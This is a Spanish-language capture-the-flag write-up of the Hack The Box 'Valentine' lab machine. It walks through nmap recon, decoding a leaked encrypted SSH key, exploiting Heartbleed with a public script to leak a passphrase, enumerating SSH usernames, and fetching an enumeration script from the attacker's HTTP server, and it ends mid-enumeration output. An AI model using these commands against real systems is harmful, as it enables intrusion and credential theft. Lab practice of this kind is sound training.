---
title: Hack The Box Valentine
author: k4miyo
date: 2021-10-19
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [Patch Management]
ping: true
---

## Valentine
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.79.

```bash
❯ ping -c 1 10.10.10.79
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=138 ms

--- 10.10.10.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 138.465/138.465/138.465/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.79 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 18:26 CDT
Initiating Ping Scan at 18:26
Scanning 10.10.10.79 [4 ports]
Completed Ping Scan at 18:26, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:26
Scanning 10.10.10.79 [65535 ports]
Discovered open port 22/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
Completed SYN Stealth Scan at 18:27, 38.50s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 38.84 seconds
           Raw packets sent: 69311 (3.050MB) | Rcvd: 69308 (2.772MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.79
   5   │     [*] Open ports: 22,80,443
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80,443 10.10.10.79 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 18:28 CDT
Nmap scan report for 10.10.10.79
Host is up (0.14s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2021-10-19T23:33:30+00:00; +4m49s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 4m48s

Service detection performed. Please report any incorrect resu
```

De los resultados obtenidos de la captura de `nmap`, vemos el dominio `valentine.htb`; como ya sabemos, lo agregamos a nuestro archivo `/etc/hosts` y procedemos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://valentine.htb/
http://valentine.htb/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
❯ whatweb https://valentine.htb/
https://valentine.htb/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```

Vemos que nos enfrentamos ante un **Apache 2.2.22**, **PHP 5.3.10** y sistema operativo **Ubuntu Linux**. Vamos a tratar de ver el sitio via web:

![](/assets/images/htb-valentine/valentine_web.png)

Nos vemos nada interensante, así que vamos a tratar de descubrir recursos dentro del servidor con `nmap`:

```bash
❯ nmap --script http-enum -p80,443 10.10.10.79
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 18:33 CDT
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.14s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
443/tcp open  https
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
```

Vemos que tanto  para el puerto 80 como para el puerto 443 se tienen los mismos recursos: `/dev/` y `/index/`; así que vamos a echarles un ojo. Para el recurso `/index/` no tenemos nada interesante, pero en `/dev/` vemos dos archivos curiosos:

![](/assets/images/htb-valentine/valentine_dev.png)

![](/assets/images/htb-valentine/valentine_notes.png)

![](/assets/images/htb-valentine/valentine_key.png)

En el archivo `hype_key` vemos un código en hexdecimal, por lo que desde nuestra máquina vamos a ver que es:

```bash
❯ curl -s http://valentine.htb/dev/hype_key | tr -d ' ' | xxd -ps -r; echo
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Tenemos una **ida_rsa** que se encuentra cifrada, por lo que hay que tratar de obtener la contraseña asociada a dicha llave; podríamos tratar de crear un hash con la herramienta `ssh2john` y luego tratar de crackear dicho hash con `john` y el uso del diccionario `rockyou.txt`; sin embargo, no nos va a arrojar ningun resultado. 

Vamos a tratar de utilizar otro vector, así que vamos a utilizar `nmap` con los scripts `vuln and safe` sobre el puerto 443:

```bash
❯ nmap --script "vuln and safe" -p443 10.10.10.79 -oN vulnScan
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 20:20 CDT
Nmap scan report for valentine.htb (10.10.10.79)                                                                                 
Host is up (0.14s latency).                                                                                                      
                                                                                                                                 
PORT    STATE SERVICE                                           
443/tcp open  https                                             
| ssl-poodle:       
|   VULNERABLE:                                                 
|   SSL POODLE information leak
|     State: VULNERABLE                                         
|     IDs:  BID:70574  CVE:CVE-2014-3566                                                                                         
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14                                                                                                |     Check results:                                            
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:      
|       https://www.securityfocus.com/bid/70574                                                                                  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566                                                             |       https://www.openssl.org/~bodo/ssl-poodle.pdf                                                                             
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
| ssl-heartbleed: 
|   VULNERABLE:                                                 
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing i
nformation intended to be protected by SSL/TLS encryption.                                                                       
|     State: VULNERABLE                                                                                                          
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartble
ed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure 
of otherwise encrypted confidential information as well as the encryption keys themselves.
|                      
|     References:                                                                                                                
|       http://cvedetails.com/cve/2014-0160/                                                                                     
|       http://www.openssl.org/news/secadv_20140407.txt                                                                          
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt

Nmap done: 1 IP address (1 host up) scanned in 24.79 seconds
```

Vemos la vulnerabilidad **SSL HEARTBLEED**; así que vamos a buscar posibles exploits público y encontramos [heartbleed.py](https://gist.github.com/eelsivart/10174134):

```bash
❯ wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
--2021-10-19 20:24:41--  https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
Resolviendo gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con gist.githubusercontent.com (gist.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 18230 (18K) [text/plain]
Grabando a: «heartbleed.py»

heartbleed.py                    100%[=======================================================>]  17.80K  --.-KB/s    en 0.005s  

2021-10-19 20:24:41 (3.17 MB/s) - «heartbleed.py» guardado [18230/18230]

❯ python2 heartbleed.py

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
```

Si ejecutamos el exploit, vemos que nos solicita algunos parámetros, como el server, que es la dirección IP víctima, el puerto, que para este caso es 443 y vamos a utilizar el parámetro `-n` relacionadoa las veces de conexion para que nos pueda traer mayor información de la memoria; utilizaremos `-n 100`:

```bash
❯ python2 heartbleed.py -n 100 -p 443 10.10.10.79                                                                                
                                                                                                                                 
defribulator v1.16                                                                                                               
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)                                        
                                                                                                                                 
##################################################################                                                               
Connecting to: 10.10.10.79:443, 100 times                                                                                        
Sending Client Hello for TLSv1.0                                                                                                 
Received Server Hello for TLSv1.0                                                                                                
                                                                                                                                 
WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!                                               
Please wait... connection attempt 100 of 100                                                                                     
##################################################################                                                               
                                                                                                                                 
.@....SC[...r....+..H...9...                                                                                                     
....w.3....f...                                                                                                                  
...!.9.8.........5...............                                                                                                
.........3.2.....E.D...../...A.................................I.........
...........                                                                                                                      
...................................#.@....SC[...r....+..H...9...                                                                 
....w.3....f...                                                                                                                  
...!.9.8.........5...............                                                                                                
.........3.2.....E.D...../...A.................................I.........                                                        
...........                                                                                                                      
...................................#.......0.0.1/decode.php                                                                      
Content-Type: application/x-www-form-urlencoded                                                                                  
Content-Length: 42                                                                                                               
                                                                                                                                 
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..=....n...i;H                                                                         
.vsfv.@....SC[...r....+..H...9...                                                                                                
....w.3....f...                                                                                                                  
...!.9.8.........5...............                                                                                                
.........3.2.....E.D...../...A.................................I.........                                                        
...........                                                                                                                      
...................................#.@....SC[...r....+..H...9...                                                                 
....w.3....f...                                                                                                                  
...!.9.8.........5...............                                                                                                
.........3.2.....E.D...../...A.................................I.........                                                        
...........                                                                                                                      
...................................#.@....SC[...r....+..H...9...                                                                 
....w.3....f...                                                                                                                  
...!.9.8.........5...............                                                                                                
.........3.2.....E.D...../...A.................................I.........                                                        
...........                                                                                                                      
...................................#.......0.0.1/decode.php                                                                      
Content-Type: application/x-www-form-urlencoded                                                                                  
Content-Length: 42
                                                                                                                                 
..2..h.@....SC[...r....+..H...9...eXBlCg==`2$.m.z.*.                                                                             
....w.3....f...                                                                                                                  
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

O......@..4v.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.@....SC[...r....+..H...9... 
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
...
```

Dentro de los resultados observamos, se tiene la variable `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`, que se encuentra en base64, así que vamos a ver el valor asociado:

```bash
❯ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

Podría ser la contraseña relacionada al archivo id_rsa; por lo tanto, podriamos tratar de ingresar a la máquina por el puerto 22 utilizando al id_rsa (con los permisos correctos) y como el usuario **hype** (se toma dicho usuario porque el nombre del archivo donde encontramos la id_rsa se llama **hype_key** y lo podemos validar con la herramienta [ssh-check-username.py](https://github.com/rtaylor777/scripts/blob/master/ssh-check-username.py) que para correrla es necesario instalar `pip2 install cryptography==2.2.2` y `pip2 install paramiko==2.0.8`):

```bash
❯ python2 ssh-check-username.py --port 22 10.10.10.79 k4miyo 2>/dev/null
[*] Invalid username
❯ python2 ssh-check-username.py --port 22 10.10.10.79 hype 2>/dev/null
[+] Valid username
```

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa hype@10.10.10.79
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
hype@Valentine:~$
```

Ya nos encontramos en la máquina como el usuario **hype** y podemos visualizar la flag (user.txt). Ahora vamos a tratar de enumerar un poco el sistema y lo haremos a través de la herramienta [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration):

```bash
❯ git clone https://github.com/diego-treitos/linux-smart-enumeration
Clonando en 'linux-smart-enumeration'...
remote: Enumerating objects: 558, done.
remote: Counting objects: 100% (195/195), done.
remote: Compressing objects: 100% (116/116), done.
remote: Total 558 (delta 121), reused 146 (delta 79), pack-reused 363
Recibiendo objetos: 100% (558/558), 10.65 MiB | 8.34 MiB/s, listo.
Resolviendo deltas: 100% (324/324), listo.
```

Nos compartimos un servidor HTTP con python y transferimos el archivo `lse.sh` a la máquina víctima en el directorio `/dev/shm`:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.79 - - [19/Oct/2021 21:05:56] "GET /lse.sh HTTP/1.1" 200 -
```

```bash
hype@Valentine:~$ cd /dev/shm
hype@Valentine:/dev/shm$ ll
total 0
drwxrwxrwt  2 root root  40 Oct 19 16:17 ./
drwxr-xr-x 20 root root 740 Oct 19 18:42 ../
hype@Valentine:/dev/shm$ wget http://10.10.14.16/lse.sh
--2021-10-19 19:10:45--  http://10.10.14.16/lse.sh
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: `lse.sh'

100%[=======================================================================================>] 43,570       154K/s   in 0.3s    

2021-10-19 19:10:46 (154 KB/s) - `lse.sh' saved [43570/43570]

hype@Valentine:/dev/shm$
hype@Valentine:/dev/shm$ chmod +x lse.sh
hype@Valentine:/dev/shm$ 
hype@Valentine:/dev/shm$ ./lse.sh -h
Use: ./lse.sh [options]

 OPTIONS
  -c           Disable color
  -C           Use alternative color scheme
  -i           Non interactive mode
  -h           This help
  -l LEVEL     Output verbosity level
                 0: Show highly important results. (default)
                 1: Show interesting results.
                 2: Show all gathered information.
  -s SELECTION Comma separated list of sections or tests to run. Available
               sections:
                 usr: User related tests.
                 sud: Sudo related tests.
                 fst: File system related tests.
                 sys: System related tests.
                 sec: Security measures related tests.
                 ret: Recurrent tasks (cron, timers) related tests.
                 net: Network related tests.
                 srv: Services related tests.
                 pro: Processes related tests.
                 sof: Software related tests.
                 ctn: Container (docker, lxc) related tests.
               Specific tests can be used with their IDs (i.e.: usr020,sud)
  -e PATHS     Comma separated list of paths to exclude. This allows you
               to do faster scans at the cost of completeness
  -p SECONDS   Time that the process monitor will spend watching for
               processes. A value of 0 will disable any watch (default: 60)
  -S           Serve the lse.sh script in this host so it can be retrieved
               from a remote
hype@Valentine:/dev/shm$ 
```

Ejecutamos el script con el parámetro `-l 1` para que nos agregue información de interés:

```bash
hype@Valentine:/dev/shm$ ./lse.sh -l 1                                                                                           
---                                                                                                                              
If you know the current user password, write it here to check sudo privileges:                                                   
---                                                                                                                              
                                                                                                                                 
 LSE Version: 3.7                                                                                                                
                                                                                                                                 
        User: hype                                                                                                               
     User ID: 1000                                                                                                               
    Password: none                                                                                                               
        Home: /home/hype                                                                                                         
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games                                            
       umask: 0002                                                                                                               
                                                                                                                                 
    Hostname: Valentine                                                                                                          
       Linux: 3.2.0-23-generic                                                                                                   
Distribution: Ubuntu 12.04 LTS                                                                                                   
Architecture: x86_64                                                                                                             
                                                                                                                                 
==================================================================( users )=====                                                 
[i] usr000 Current user groups............................................. yes!                                                 
[*] usr010 Is current user in an administrative group?..................... nope                                                 
[*] usr020 Are there other users in administrative groups?................. nope                                                 
[*] usr030 Other users with shell.......................................... yes!                                                 
---                                                                                                                              
root:x:0:0:root:/root:/bin/bash                                                                                                  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh                                                                                            
bin:x:2:2:bin:/bin:/bin/sh                                                                                                       
sys:x:3:3:sys:/dev:/bin/sh                                                                                                       
games:x:5:60:games:/usr/games:/bin/sh                                                                                            
man:x:6:12:man:/var/cache/man:/bin/sh                                                                                            
lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                                                                               
mail:x:8:8:mail:/var/mail:/bin/sh                                                                                                
news:x:9:9:news:/var/spool/news:/bin/sh                                                                                          
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                                                                                        
proxy:x:13:13:proxy:/bin:/bin/sh                                                                                                 
www-data:x:33:33:www-data:/var/www:/bin/sh                                                                                       
backup:x:34:34:backup:/var/backups:/bin/sh                                                                                       
list:x:38:38:Mailing List Manager:/var/list:/bin/sh                                                                              
irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                                                                           
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh                                                          
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                                                                                 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh                                                                                      
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh                                               
hype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bash
---                                                                                                                              
[i] usr040 Environment information......................................... skip                                                 
[i] usr050 Groups for other users.......................................... skip                                                 
[i] usr060 Other users..................................................... skip                                                 
[*] usr070 PATH variables defined inside /etc.............................. yes!
---
/bin
/bin
/sbin
/usr/bin
/usr/games
/usr/local/bin
/usr/local/sbin
/usr/local/sbin
/usr/sbin
---
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
---
/run/vmware/guestServicePipe
/run/acpid.socket
/run/avahi-daemon/socket
/run/sdp
/run/cups/cups.sock
/run/dbus/system_bus_socket
/run/shm
/run/shm/lse.sh
/run/lock
/.devs/dev_sess
/var/lib/php5
/var/www/omg.jpg
/var/tmp
/var/crash
/tmp
/tmp/tmp.9qWzROTtty
/tmp/tmux-1000
/tmp/.ICE-unix
/tmp/tmp.arePmwDykO
/tmp/.X11-unix
---
[*] fst010 Binaries with setuid bit........................................ yes!
---
/bin/su
/bin/fusermount
/bin/umount
/bin/ping
/bin/ping6
/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/pkexec
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/arping
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/sbin/uuidd
/usr/sbin/pppd
---
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/bin/X
/usr/bin/lppasswd
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... yes!
---
-rw------- 1 hype hype 1766 Dec 13  2017 /home/hype/.ssh/id_rsa
-rw------- 1 hype hype 222 Dec 13  2017 /home/hype/.ssh/known_hosts
-rw-r--r-- 1 hype hype 397 Dec 13  2017 /home/hype/.ssh/id_rsa.pub
-rw------- 1 hype hype 397 Dec 13  2017 /home/hype/.ssh/authorized_keys
---
[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/dig
/usr/bin/gcc
/bin/nc.openbsd
/bin/nc
/bin/netcat
/usr/bin/wget
---
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'hype' have mail?.......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'hype'...................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin yes
---
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
---
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
---
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *       * * *   root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6       * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6       * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
